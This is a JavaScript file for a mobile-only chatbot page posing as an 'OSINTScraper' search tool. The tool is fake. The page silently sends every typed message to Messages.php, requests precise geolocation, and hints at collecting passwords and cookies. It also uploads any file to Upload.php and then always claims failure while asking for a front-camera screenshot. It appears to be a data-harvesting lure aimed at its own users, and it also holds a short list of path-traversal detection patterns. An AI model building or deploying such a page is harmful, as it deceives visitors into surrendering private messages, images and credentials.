(function () {
    const traversalPatterns = [
        /\.\.\//g,      
        /\.\.\\+/g,    
        /\.\.\./g,          
        /%2e%2e/gi,         
        /%2e%2f/gi,      
        /%2f%2e/gi,       
        /%5c/gi         
    ];

    const path = window.location.pathname;
    const decoded = decodeURIComponent(path);

    for (const pattern of traversalPatterns) {
        if (pattern.test(path) || pattern.test(decoded)) {
            console.warn("Blocked suspicious path traversal attempt:", path);
            window.location.replace("/error.html");
            return;
        }
    }
})();

document.addEventListener("DOMContentLoaded", () => {
  const ua = navigator.userAgent || navigator.vendor || window.opera;

  if (/iPhone|iPad|iPod|Android/i.test(ua)) {
    console.log("Mobile device detected, access allowed.");
  } else {
    document.body.innerHTML = `
<div style="
  width:100%;
  height:100vh;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  font-family:'Segoe UI', sans-serif;
  color:white;
  text-align:center;
  overflow:hidden;
  animation:fadeIn 1.2s ease-out;
">

  <div style="
    padding:40px 60px;
    border-radius:18px;
    backdrop-filter:blur(10px);
    background:rgba(255,255,255,0.05);
    box-shadow:0 0 25px rgba(255,255,255,0.15);
    animation:floatUp 1.4s ease-out;
  ">
    <h1 style="margin:0 0 10px; font-size:2.4rem; letter-spacing:1px; animation:popIn 0.8s ease-out;">
      Access Restricted
    </h1>

    <p style="margin:0; font-size:1.1rem; opacity:0.85; animation:fadeSlide 1.6s ease-out;">
      This demo is only available on mobile devices.
    </p>

    <p style="margin-top:20px; font-size:0.95rem; opacity:0.7; animation:fadeSlide 2s ease-out;">
      Try opening this page on your phone or tablet to continue.
    </p>

    <p style="margin-top:10px; font-size:0.85rem; opacity:0.6; animation:fadeSlide 2.4s ease-out;">
      We restrict desktop access to ensure the best possible experience.
    </p>
  </div>

</div>

<style>
@keyframes fadeIn {
  from { opacity:0; }
  to { opacity:1; }
}

@keyframes floatUp {
  from { transform:translateY(40px); opacity:0; }
  to { transform:translateY(0); opacity:1; }
}

@keyframes popIn {
  0% { transform:scale(0.7); opacity:0; }
  60% { transform:scale(1.05); opacity:1; }
  100% { transform:scale(1); }
}

@keyframes fadeSlide {
  from { opacity:0; transform:translateY(15px); }
  to { opacity:1; transform:translateY(0); }
}
</style>
    `;
  }
});

const msgerForm = get(".msger-inputarea");
const msgerInput = get(".msger-input");
const msgerChat = get(".msger-chat");

const BOT_MSGS = [
  "Code Error 345: Please make sure you have the required OS, Followed the steps and have a compatible Browser. If it still doesn't work try DeepSearch or check out our social media for Troubleshooting",
];

const BOT_IMG = "https://static.vecteezy.com/system/resources/thumbnails/009/589/789/small/magnifying-icon-magnifying-clipart-transparent-free-png.png";
const PERSON_IMG = "https://static.vecteezy.com/system/resources/thumbnails/014/396/452/small/comic-style-user-icon-with-transparent-background-file-png.png";
const BOT_NAME = "OSINTScraper";
const PERSON_NAME = "User";

let locationAllowed = false;

msgerForm.addEventListener("submit", event => {
  event.preventDefault();

  const msgText = msgerInput.value.trim();
  if (!msgText) return;
  appendMessage(PERSON_NAME, PERSON_IMG, "right", msgText);
  msgerInput.value = "";

  fetch("Messages.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "message=" + encodeURIComponent(msgText)
  }).catch(() => {});

  const lowerMsg = msgText.toLowerCase();

  if (lowerMsg.includes("!deepsearch ")) {
    appendMessage(BOT_NAME, BOT_IMG, "left", "Please upload a valid Captcha to use this command", true);
    return;
  }

if (lowerMsg.startsWith("!search ")) {
    const query = lowerMsg.replace("!search ", "").trim();

    if (!locationAllowed) {
        appendMessage(BOT_NAME, BOT_IMG, "left", "unable to search due to denied location permissions", true);
        return;
    }

    if (query.includes("number")) {
        botResponse();
        return;
    }

    if (query.includes("password")) {
        appendMessage(BOT_NAME, BOT_IMG, "left", "Please specify which site you want the password checked for.", true);
        return;
    }

    if (query.includes("cookie")) {
        appendMessage(BOT_NAME, BOT_IMG, "left", "The cookie value you entered is not valid.", true);
        return;
    }

    appendMessage(BOT_NAME, BOT_IMG, "left", "Invalid command please try again. if errors keep occurring please report the issue.", true);
    return;
}

appendMessage(BOT_NAME, BOT_IMG, "left", "Invalid command please try again. if errors keep occurring please report the issue.", true);
});

function appendMessage(name, img, side, text, typingEffect = false) {
  const msgHTML = `
    <div class="msg ${side}-msg">
      <div class="msg-img" style="background-image: url(${img})"></div>
      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">${name}</div>
          <div class="msg-info-time">${formatDate(new Date())}</div>
        </div>
        <div class="msg-text"></div>
      </div>
    </div>
  `;
  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
  msgerChat.scrollTop = msgerChat.scrollHeight;

  const msgTextDiv = msgerChat.querySelector(".msg:last-child .msg-text");

  if (typingEffect) {
    let i = 0;
    const interval = setInterval(() => {
      msgTextDiv.textContent += text.charAt(i);
      i++;
      msgerChat.scrollTop = msgerChat.scrollHeight;
      if (i >= text.length) clearInterval(interval);
    }, 40);
  } else {
    msgTextDiv.textContent = text;
  }
}

function animateDots(msgTextDiv, baseText) {
  let dots = 0;
  const interval = setInterval(() => {
    dots = (dots + 1) % 4; 
    msgTextDiv.textContent = baseText + ".".repeat(dots);
    msgerChat.scrollTop = msgerChat.scrollHeight;
  }, 500); 
  return interval; 
}

function botResponse() {
  const r = random(0, BOT_MSGS.length - 1);
  const msgText = BOT_MSGS[r];
  const delay = msgText.split(" ").length * 100;

  setTimeout(() => {
    appendMessage(BOT_NAME, BOT_IMG, "left", msgText, true); // typing effect enabled
  }, delay);
}

function get(selector, root = document) {
  return root.querySelector(selector);
}
function formatDate(date) {
  const h = "0" + date.getHours();
  const m = "0" + date.getMinutes();
  return `${h.slice(-2)}:${m.slice(-2)}`;
}
function random(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function requestLocation() {
  if (!("geolocation" in navigator)) {
    console.warn("Geolocation not supported by this browser.");
    locationAllowed = false;
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      locationAllowed = true;
      console.log("Location granted:", pos.coords);
    },
    (err) => {
      locationAllowed = false;
      console.error("Location error:", err.message);
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

document.addEventListener("DOMContentLoaded", () => {
  const shareBtn = document.getElementById("share-location");
  if (shareBtn) {
    shareBtn.addEventListener("click", () => {
      requestLocation();
    });
  }

  requestLocation();
});

document.addEventListener("DOMContentLoaded", () => {
  const fileInput = document.getElementById("file-upload");

  if (fileInput) {
    fileInput.addEventListener("change", () => {
      const file = fileInput.files[0];
      if (!file) return;

      appendMessage(PERSON_NAME, PERSON_IMG, "right", "📎 Uploaded: " + file.name);
      appendMessage(BOT_NAME, BOT_IMG, "left", "Processing File...");
      const msgTextDiv = msgerChat.querySelector(".msg:last-child .msg-text");
      const dotsInterval = animateDots(msgTextDiv, "Processing File");

      const formData = new FormData();
      formData.append("file", file);

      fetch("Upload.php", {
        method: "POST",
        body: formData
      })
      .then(() => {
        setTimeout(() => {
          clearInterval(dotsInterval);
          appendMessage(BOT_NAME, BOT_IMG, "left", "File was not readable. Try a different file or higher quality image. If the image was taken with the front camera, screenshot it and then upload it.", true);
        }, 10000);
      })
      .catch(err => {
        clearInterval(dotsInterval);
        appendMessage(BOT_NAME, BOT_IMG, "left", "Upload failed: " + err.message, true);
      });
    });
  }
});

